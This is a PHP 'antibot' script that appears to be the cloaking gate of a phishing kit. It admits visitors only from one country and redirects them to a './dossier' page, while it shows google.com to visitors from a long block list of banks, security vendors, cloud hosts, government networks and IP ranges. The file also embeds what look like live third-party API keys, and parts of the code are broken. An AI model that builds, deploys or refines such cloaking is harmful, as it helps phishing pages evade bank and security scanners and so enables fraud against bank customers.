<?php

class Antibot
{
    function config($real, 
                    $bot, 
                    $ina_blad_bghiti,
                    $black_list, 
                    $block_list,
                    $block_isp_loc,
                    $api_botkey,
                    $api_boturl,
                    $api_ipkey,
                    $api_ipurl, 
                    $timezone){
        date_default_timezone_set($timezone);
        $this->$real = $real;
        $this->bot =$bot;
        $this->ina_blad_bghiti = $ina_blad_bghiti;
        $this->black_list = $black_list;
        $this->block_list = $block_list;
        $this->blocked_isp_loc = $block_isp_loc;
        $this->api_botkey = $api_botkey;
        $this->api_boturl = $api_boturl;
        $this->api_ipkey = $api_ipkey;
        $this->api_ipurl = $api_ipurl;
        $this->timezon = $timezone;
    }

    function get_client_ip(){
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
            $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
            $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }

        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];

        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }

        return $ip;
    }

    function isbot(){
        $b = $_SERVER['HTTP_USER_AGENT'];
        if(!$b){
            return true;
        }
        $blocked_isp_loc = $this->blocked_isp_loc;
        if(file_exists($blocked_isp_loc)){
            $ta = preg_replace('/\s+/',' ',file_get_contents($blocked_isp_loc));
            $a = explode(',',$ta);
            foreach($a as $aa){
                if( stripos( $b, trim($aa) ) !== false ) return true;
            }
            $isp = explode('.',gethostbyaddr(get_client_ip()));
            foreach($isp as $i){
                foreach($a as $aa){
                    if( stripos( $i, trim($aa) ) !== false ) return true;
                }
            }
        }
        return false;
    }

    function check(){
        $ip = $_SERVER['REMOTE_ADDR'];
        $hostname = gethostbyaddr($ip);
        $api_key = $this->api_ipkey;
        $api_url = $this->api_ipurl;
        
        $url = "{$api_url}?apiKey={$api_key}&ipAddress={$ip}"; // 
        $query = json_decode(file_get_contents($url),true);
        $country = $query['location']['country'];
        $isp = $query['isp'];
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        if($country != ($this->ina_blad_bghiti)){
            $result = '<table > 
                    <tr>
                        <td style="color:red;">'.$ip.'</td>
                        <td style="color:red;">'.$country.'</td>
                        <td style="color:red;">'.$isp.'</td>
                        <td style="color:red;">Bot</td>
                        <td style="color:red;">'.date('Y-m-d h:i:sa').'</td>
                    </tr>
                </table>';
            $this->save_bot($result);
            $this->bot_action(); 
            exit();
        }
        else {
            foreach($black_list as $item) {
                if( stripos($isp, $item) !== false || isbot()){
                    $result ='<table > 
                        <tr>
                            <td style="color:red;">'.$ip.'</td>
                            <td style="color:red;">'.$country.'</td>
                            <td style="color:red;">'.$isp.'</td>
                            <td style="color:red;">Bot</td>
                            <td style="color:red;">'.date('Y-m-d h:i:sa').'</td>
                        </tr>
                    </table>';
                $this->save_bot($result);
                $this->bot_action(); 
                exit();
                }
            }
            foreach($block_list as $item) {
                if( strpos($ip,$item) === 0){
                    
                    $result ='<table > 
                        <tr>
                            <td style="color:red;">'.$ip.'</td>
                            <td style="color:red;">'.$country.'</td>
                            <td style="color:red;">'.$isp.'</td>
                            <td style="color:red;">Bot</td>
                            <td style="color:red;">'.date('Y-m-d h:i:sa').'</td>
                        </tr>
                    </table>';
                    
                    $this->save_bot($result);
                    $this->bot_action();
                    exit();
                }
            }
            $this->save_ip($ip.PHP_EOL);
            sleep(0.3);
            $check_allow= file_get_contents('allow2.txt');
            if (stripos($check_allow, $ip) !== FALSE) {
                $ANTIBOT_PW=$this->api_botkey;
                $ua = str_replace(' ', '', $_SERVER['HTTP_USER_AGENT']);
                $check = json_decode(file_get_contents($this->api_boturl.'ip='. $ip .'&apikey='. $ANTIBOT_PW .'&ua=' . $ua),true);
                $is_bot = $check['is_bot'];
                if($is_bot != 1) {
                    $result = '<table > 
                                    <tr>
                                        <td style="color:green;">'.$ip.'</td>
                                        <td style="color:green;">'.$country.'</td>
                                        <td style="color:green;">'.$isp.'</td>
                                        <td style="color:green;">User</td>
                                        <td style="color:green;">'.date('Y-m-d h:i:sa').'</td>
                                    </tr>
                                </table>';
                                $this->save_ipa($ip.PHP_EOL);
                                $this->save_rs($result);
                                $this->header('Location: '.$this->real);
                    exit();
                }
                $this->bot_action();
            }
            else
            {
                $this->bot_action();
            }
            exit();
        }
    }

    function save_rs($rs) {
    
        $file = fopen("./drog.htm","a");
            fwrite($file,$rs);
            fclose($file);
    }
    
    function save_bot($rs) {
    
        $file = fopen("./bad.htm","a");
            fwrite($file,$rs);
            fclose($file);
    }
    
    function save_ip($ip) {
    
        $file = fopen("./allow.txt","a");
            fwrite($file,$ip);
            fclose($file);
    }
    
    function save_ipa($ip) {
    
        $file = fopen("./allow2.txt","a");
            fwrite($file,$ip);
            fclose($file);
    }

    function bot_action() {
        echo file_get_contents($this->bot);
        exit();
    }

}

/**CONFIG */
$config_antibot['real'] = "./dossier";
$config_antibot['bot'] = "https://google.com";
$config_antibot['ina_blad_bghiti'] = "SG";
$config_antibot['black_list'] = [  
    "Kinet"  ,  "a.s." , "s.r.o."  , "DetronicsRoute" ,  "Salamon", "Obecne" , "O2 Business Services" , "DSI DATA",
	"OVH",  "CompleTel", "SWAN", "VNET", "COLT", "Ozone", "Herault", "Supernet", "Interveille", "hosting", "VIALIS", 
	"LINKSIP", "SAEM", "GTT", "TELOISE", "Nexeon", "Commerciale",  "CRIHAN", "ICAUNAISE", "COOPERATIVE", "NORDNET-EXT",
	"INFOMIL-CLTPARIS" , "NORDNET", "Technologies" , "cloud", "Knet", "Systeme", "Telia", "EI-TELECOM", "Interministerielle",
	"Security", "Metropole", "GALIANA", "CNAMTS", "Alcatraz", "Adista", "KEYYO", "Teranet", "OpenIP-Network", "CEGETEL", 
	"DISIC-RIE", "M247", "ALTSYSNET-OCCITANET5G", "Google", "UNIMEDIA-SERVICES", "Cogent", "Netprotect", "velia.net",
	"NATIXIS", "Electricite", "Labs", "Lyre", "Serveurcom", "Rezopole", "Appliwave", "Epargne", "Anexia", "Caisse",
	"Sewan" , "Reunicable" , "Axione", "Scalair", "Colt", "epargne", "caisse", "Poste",  "Nerim", "Choopa", "SPIE", 
	"Paritel", "Microsoft", "DATACENTER", "Layer", "ZSCALER", "Coaxis", "Firewall",  "Microsoft" , "RENATER" , "Online" , 
	"Traitement" , "Dedicated" , "Owentis" , "Coriolis" , "Zscaler", "OZN", "CNCA", "Jaguar", "Vultr", "Holdings", "LLC", 
	"NSC-SOLUTIONS", "Backbone", "DSL",  "VadeSecure", "Datacamp", "Momax", "Mutuel" , "FIMATEX" , "NEO", "Credit", 
	"Agricole",  "PSINet", "Skylogic",  "Herault-networks" , "Alliance", "Connectic", "MYSTREAM", "Amazon", "GROUPAMA", 
	"IRIS64", "Francaise", "Opentransit", "Radiotelephone", "BPCE", "Rezocean", "K-net", "SCALEWAY", "Brutele"
];
$config_antibot['block_list'] = [ 
    "193.56.2" ,  "92.147.12.196" , "90.187.228.189" ,"194.78", "194.78.", "37.201.192.242", 
	"79.166.147.44", "85.73.24.124", "5.203.224.203", "176.167.97.91", "176.176.30" , 
	"194.206" , "185.", "176.149.93", "82.120.84" , "94.143.176" , "185.228.2", 
	"176.148.157" , "193.57" , "89.210.43.74" ,"62.74.15.205"  , "2.10.4" , "92.184" , 
	"109.221" , "77.8.175.91" , "31.17.250.35" , "86.62.213.130" , "78.101.170.24" , 
	"31.11.51.55" 
];
$config_antibot['block_isp_loc'] = "black_isp.txt";
$config_antibot['timezone'] = "Europe/Paris";
$config_antibot['api_botkey'] = "e7032b2522dfd49f07ba78770ba4dddd";
$config_antibot['api_boturl'] = "https://antibot.pw/api/v2-blockers";
$config_antibot['api_ipkey'] = "at_NslOlY6RJx71Iyc1ShAjy5YbcmEBT";
$config_antibot['api_ipurl'] = "https://geo.ipify.org/api/v1";

/**MAIN */
$Antibot = new Antibot;
$Antibot->config(
    $config_antibot['real'],
    $config_antibot['bot'],
    $config_antibot['ina_blad_bghiti'],
    $config_antibot['black_list'],
    $config_antibot['block_list'],
    $config_antibot['block_isp_loc'],
    $config_antibot['api_botkey'],
    $config_antibot['api_boturl'],
    $config_antibot['api_ipkey'],
    $config_antibot['api_ipurl'],
    $config_antibot['timezone'],
);
$Antibot->check();

